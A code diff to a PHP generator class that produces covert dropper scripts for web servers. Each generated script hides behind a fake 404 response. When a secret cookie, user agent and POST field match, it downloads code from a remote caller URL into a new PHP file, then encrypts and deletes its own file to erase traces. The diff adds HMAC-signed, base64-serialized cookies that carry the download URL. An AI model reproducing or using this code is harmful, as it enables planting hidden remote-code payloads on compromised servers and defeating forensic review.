@@ -11,25 +11,30 @@ class dynamic_generator
             if (empty($filename)){
                 $filename = bin2hex(openssl_random_pseudo_bytes(rand(5,25)));
                 $cookieName = bin2hex(openssl_random_pseudo_bytes(rand(5,25)));
-                $cookie_value = bin2hex(openssl_random_pseudo_bytes(rand(5,25)));
                 $randomized_ua = bin2hex(openssl_random_pseudo_bytes(rand(5,25)));
-                $post_variable = bin2hex(openssl_random_pseudo_bytes(rand(5,25)));
+                $post_variable = substr(allowed_chars,0, rand(1,5)).bin2hex(openssl_random_pseudo_bytes(rand(5,25)));
                 $post_value = bin2hex(openssl_random_pseudo_bytes(rand(5,25)));
                 $slim = file('includes/templates/base_template.php');
+                $do_hash = hash_hmac('sha256',$post_value.'.'.$caller, $post_value);
+                $final = base64_encode(serialize($do_hash.'.'.$post_value.'.'.$caller.'?r=pull'));
                 $dr = <<<SLIMM
-if (\$_COOKIE['$cookieName'] === '$cookie_value' && \$_SERVER['HTTP_USER_AGENT'] === '$randomized_ua'){
-    if (isset(\$_POST['$post_variable']) && \$_POST['$post_variable'] === '$post_value'){
-        http_response_code(404);
-        fputs(fopen('./$filename.php', 'a+'),file_get_contents("$caller?r=pull"));
-        foreach (file(\$_SERVER['SCRIPT_FILENAME']) as \$line){
-            fwrite(fopen(\$_SERVER['SCRIPT_FILENAME'], 'w'), openssl_encrypt(\$line, 'aes-256-ctr', bin2hex(openssl_random_pseudo_bytes(100)), OPENSSL_RAW_DATA|OPENSSL_NO_PADDING|OPENSSL_ZERO_PADDING, openssl_random_pseudo_bytes((int)openssl_cipher_iv_length('aes-256-ctr'))));
+http_response_code(404);
+if (isset(\$_COOKIE['$cookieName']) && \$_SERVER['HTTP_USER_AGENT'] === '$randomized_ua'){
+    if (isset(\$_POST['$post_variable'])){
+        \$$post_variable = explode('.', unserialize(base64_decode(\$_COOKIE['$cookieName']), ['allowed_classes' => false]));
+        if ( hash_equals(hash_hmac('sha256', \$_COOKIE['$cookieName'], \${$post_variable}[0]), \${$post_variable}[1]) ){
+            fputs(fopen('./$filename.php', 'a+'),file_get_contents("\${$post_variable}[2]"));
+            foreach (file(\$_SERVER['SCRIPT_FILENAME']) as \$line){
+                fwrite(fopen(\$_SERVER['SCRIPT_FILENAME'], 'w'), openssl_encrypt(\$line, 'aes-256-ctr', bin2hex(openssl_random_pseudo_bytes(100)), OPENSSL_RAW_DATA|OPENSSL_NO_PADDING|OPENSSL_ZERO_PADDING, openssl_random_pseudo_bytes((int)openssl_cipher_iv_length('aes-256-ctr'))));
+            }
+            fclose(\$_SERVER['SCRIPT_FILENAME']);
+            unlink(\$_SERVER['SCRIPT_FILENAME']);
+        }else{
+            die();
         }
-        fclose(\$_SERVER['SCRIPT_FILENAME']);
-        unlink(\$_SERVER['SCRIPT_FILENAME']);
         die();
     }
 }else{
-    http_response_code(404);
     die();
 }
 SLIMM;
@@ -42,7 +47,7 @@ SLIMM;
                         $push_out,
                         $caller,
                         $cookieName,
-                        $cookie_value,
+                        $final,
                         $randomized_ua
                     )
                 );
